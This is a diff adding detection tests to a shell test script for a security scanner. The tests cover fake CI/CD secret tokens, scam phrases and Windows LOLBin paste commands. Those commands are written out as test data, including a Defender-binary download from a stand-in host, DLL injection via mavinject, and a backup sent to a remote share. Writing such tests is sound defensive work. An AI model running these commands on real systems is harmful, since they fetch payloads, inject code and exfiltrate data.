@@ -11671,6 +11671,36 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-216: CI/CD-secrets + paste LOLBin wave-2 + refund/quick-assist ─
+./hlse_core secret -- 'k: bkua_'"abcdefghijklmnopqrstuvwxyz1234567890abcd"'' 2>&1 | grep -q 'Buildkite' \
+    && check "secret: bkua_ Buildkite flagged" "0" "0" \
+    || check "secret: bkua_ Buildkite flagged" "0" "1"
+./hlse_core secret -- 'k: wandb_v1_'"abcdefghijklmnopqrstuvwxyz12345678"'' 2>&1 | grep -q 'Weights & Biases' \
+    && check "secret: wandb_v1_ flagged" "0" "0" \
+    || check "secret: wandb_v1_ flagged" "0" "1"
+./hlse_core secret -- 'k: sha256~'"abcdefghijklmnopqrstuvwxyz1234567890abcdef"'' 2>&1 | grep -q 'OpenShift' \
+    && check "secret: sha256~ OpenShift flagged" "0" "0" \
+    || check "secret: sha256~ OpenShift flagged" "0" "1"
+./hlse_core secret 'the bkua_ prefix alone' 2>&1 | grep -q "no credentials" \
+    && check "secret FP guard: bkua_ prose clean" "0" "0" \
+    || check "secret FP guard: bkua_ prose clean" "0" "1"
+for c in 'mpcmdrun -DownloadFile -url http://e.com -path c:\\x' 'odbcconf /f x.rsp' 'ie4uinit -show' 'rasautou -f x.dll' 'mavinject 1 /INJECTRUNNING x.dll' 'expand \\\\e.com\\s\\x.cab x' 'wbadmin start backup -backuptarget:\\\\e.com\\s' 'finger x@e.com' 'regini evil.ini'; do
+    ./hlse_core paste -- "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+./hlse_core paste -- 'ie4uinit.dll exists' 2>&1 | grep -q '^OK' \
+    && check "paste FP guard: ie4uinit prose clean" "0" "0" \
+    || check "paste FP guard: ie4uinit prose clean" "0" "1"
+./hlse_core paste -- 'odbcconf list' 2>&1 | grep -q '^OK' \
+    && check "paste FP guard: odbcconf bare clean" "0" "0" \
+    || check "paste FP guard: odbcconf bare clean" "0" "1"
+check_text_hit 'please open quick assist for me' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: open-quick-assist flagged"
+check_text_hit 'we accidentally refunded your card twice' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: accidentally-refunded flagged"
+./hlse_core text 'i refunded too much by mistake once' 2>&1 | grep -q '^OK' \
+    && check "text FP guard: benign refund confession clean" "0" "0" \
+    || check "text FP guard: benign refund confession clean" "0" "1"
+
 # ── cycle-215: ms-* handler launchers + .ica + JP delivery phrasing ─
 for s in 'ms-onenote:x' 'ms-outlook:x' 'mso-offcrypto:x' 'ms-remotedesktop:x' 'ms-rd:x' 'ms-remotedesktop-launchrcc:x'; do
     check_url_hit "$s" 'LOG\|ALERT\|BLOCK\|ISOLATE' "url: $s flagged"
